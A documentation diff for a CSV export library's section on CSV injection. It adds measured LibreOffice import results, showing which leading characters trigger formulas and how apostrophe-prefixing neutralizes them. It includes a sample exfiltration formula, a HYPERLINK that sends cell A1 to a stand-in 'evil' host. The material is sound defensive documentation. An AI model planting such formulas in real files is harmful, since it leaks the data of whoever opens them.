@@ -459,9 +459,24 @@ await downloadCsv(users, COLUMNS, "users.csv"); // hand it to the user
     A field containing the delimiter, a quote or a line break becomes a quoted field, and each inner quote is doubled. Rows terminate with `\r\n`. The BOM is on by default because without it Excel on a pt-BR install reads UTF-8 as Latin-1 and every accent turns into mojibake.
 
 !!! check "Formulas become text by default (CSV injection)"
-    A text field starting with `=`, `+`, `-`, `@`, TAB or CR is a **formula** to Excel, LibreOffice and Google Sheets — and opening the file evaluates it. A user name `=HYPERLINK("https://evil/?d="&A1,"view")` becomes a link that leaks the other cells. So `toCsv` and `downloadCsv` prefix `'` to those fields, as OWASP recommends: LibreOffice 26.2 imported `=1+2` as the formula `of:=1+2` (value `3`) before, and as the text `'=1+2` after.
+    A text field starting with `=`, `+`, `-`, `@`, TAB or CR is treated as the start of a **formula** by the OWASP list — Excel and Google Sheets read it that way; LibreOffice 26.2 only evaluated `=` (table below). Opening the file evaluates the formula. A user name `=HYPERLINK("https://evil/?d="&A1,"view")` becomes a link that leaks the other cells. So `toCsv` and `downloadCsv` prefix `'` to those fields, as OWASP recommends: LibreOffice 26.2 imported `=1+2` as the formula `of:=1+2` (value `3`) before, and as the text `'=1+2` after.
 
-    Numbers are left alone: a `number` cell, or text that is only a number (`"-5"`, `"-1.234,56"`, `"+42"`), cannot be a formula — and prefixing it would turn every negative amount in the report into text. The cost is the visible `'` in neutralized text. If the file feeds another system's importer rather than a person's spreadsheet, turn it off with `{ neutralizeFormulas: false }` and the bytes go out as they came.
+    Numbers are left alone: a `number` cell, or text that is only a number (`"-5"`, `"-1.234,56"`, `"+42"`), cannot be a formula — and prefixing it would turn every negative amount in the report into text. A lone `"-"` is left alone too: it is the "no value" placeholder and has no operand to become a formula. The cost is the visible `'` in neutralized text. If the file feeds another system's importer rather than a person's spreadsheet, turn it off with `{ neutralizeFormulas: false }` and the bytes go out as they came.
+
+How each input is read, measured by converting the CSV with LibreOffice 26.2 headless (`soffice --headless --infilter="CSV:59,34,76,1" --convert-to fods`) and reading each cell's `table:formula`:
+
+| Input | Without prefix (`neutralizeFormulas: false`) | With prefix (default) |
+| --- | --- | --- |
+| `=1+2` | formula, value `3` | text `'=1+2` |
+| `=HYPERLINK("http://…/?d="&A1,"x")` | formula | text |
+| `+55 (11) 99999-9999` | text | text `'+55 (11) 99999-9999` |
+| `@maria` | text | text `'@maria` |
+| `-` | text | text `-` (exempt) |
+| TAB + `=1+1` | text | text `'` + TAB + `=1+1` |
+| space + `=1+1` | text | text (not a trigger) |
+| `\n=1+1` (quoted field) | text | text (not a trigger) |
+
+LibreOffice only evaluated `=`. `+`, `@` and TAB stay in the trigger because Excel and Google Sheets read them as the start of a formula — that is OWASP's list, and it was not measured in Excel here.
 
 !!! tip "`;` is the right delimiter in a pt-BR locale"
     Where the decimal separator is the comma, Excel opens a comma-separated CSV **in a single column**. `{ delimiter: ";" }` fixes it — and the escaping follows, quoting the field that contains `;` instead of the one that contains `,`.
